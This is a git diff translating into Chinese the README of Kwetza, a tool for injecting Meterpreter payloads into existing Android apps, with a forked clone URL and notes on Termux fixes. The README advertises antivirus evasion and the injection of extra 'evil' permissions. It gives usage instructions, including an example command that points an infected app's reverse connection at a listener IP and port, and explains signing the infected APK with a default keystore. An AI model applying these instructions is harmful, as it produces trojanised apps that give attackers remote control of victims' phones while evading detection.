@@ -1,8 +1,7 @@
-# Introduction
+# 介绍
 By Chris Le Roy (@brompwnie) chris@sensepost.com
 
-Kwetza is a tool that allows you to infect an existing Android application with a Meterpreter payload.
-
+Kwetza是一种工具，可让您使用Meterpreter有效负载感染现有的Android应用程序。
 # 修改说明  
 以下问题均出现在手机Termux终端上<br/>
 1.指定脚本使用python3执行<br/>
@@ -10,36 +9,34 @@ Kwetza is a tool that allows you to infect an existing Android application with 
 3.修复需要一个类似于bytes的对象，而不是'str'<br/>
 4.修复'utf-8'编解码器无法解码字节0xa4在位置4:无效的开始字节<br/>
 
-# What does it do?
+# 它有什么作用？
 
-Kwetza infects an existing Android application with either custom or default payload templates to avoid detection by antivirus. Kwetza allows you to infect Android applications using the target application's default permissions or inject additional permissions to gain additional functionality.
+Kwetza使用自定义或默认有效负载模板感染现有的Android应用程序，以避免被防病毒软件检测。Kwetza允许您使用目标应用程序的默认权限感染Android应用程序，或注入其他权限以获得其他功能。
+# 在哪里可以获得博客文章？
+可以在以下位置找到由Kwetza自动化的手动步骤：https://sensepost.com/blog/2016/kwetza-infecting-android-applications/
 
-# Where can I get the blogpost?
-The manual steps automated by Kwetza can be found here: https://sensepost.com/blog/2016/kwetza-infecting-android-applications/
+# 获取代码
 
-# Getting the code
-
-Firstly get the code:
+首先获取代码：
 ```
-git clone https://github.com/sensepost/kwetza.git
+git clone https://github.com/2487686673/Kwetza.git
 ```
 
-Kwetza is written in Python and requires BeautifulSoup which can be installed using Pip:
+Kwetza用Python编写，需要BeautifulSoup，可以使用Pip安装：
 ```
 pip install beautifulsoup4
 ```
-Kwetza requires Apktool to be install and accessible via your PATH. This can be setup using the install instructions located here: https://ibotpeaches.github.io/Apktool/install
-
-# Usage
+Kwetza要求安装Apktool并可以通过您的PATH访问。可以使用位于此处的安装说明进行设置：https://ibotpeaches.github.io/Apktool/install
+# 用法
 
 python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass
 
-* nameOfTheApkToInfect.apk = name of the APK you wish to infect.
-* https/tcp = select either a HTTPS or TCP connection
-* LHOST = IP of your listener.
-* LPORT = Port of your listener.
-* yes = include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
-* customClass = Specify a custom activity here if you want Kwetza to inject into this activity.
+* nameOfTheApkToInfect.apk = 你想要感染的APK名称
+* https/tcp = 选择https或tcp连接
+* LHOST = 你的监听IP
+* LPORT = 你的监听端口
+* yes = include "yes" 向应用程序中注入其他有害权限, "no" 使用应用程序的默认权限.
+* customClass = 如果要让Kwetza注入此活动，请在此处指定一个自定义活动
 
 ```
 python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
@@ -79,18 +76,17 @@ jar signed.
 ```
 
 
-# Information
+# 信息
 
-Kwetza has been developed to work with Python 2.
+Kwetza已开发为可与Python2配合使用。
 
-Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk.
+默认情况下，Kwetza将使用位于“有效载荷”文件夹中的模板和密钥库来注入并签名受感染的apk。
 
-If you would like to sign the infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the reference in the kwetza.py.
+如果您想使用自己的证书对受感染的应用程序进行签名，请生成一个新的密钥库，并将其放置在“ payload”文件夹中，然后重命名为现有的密钥库，或者在kwetza.py中更改引用。
 
-The same can be done for payload templates.
+对于有效负载模板也可以这样做。
 
-The password for the default keystore is, well, "password".
-
+默认密钥库的密码为“password”。
 # License
 
 Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
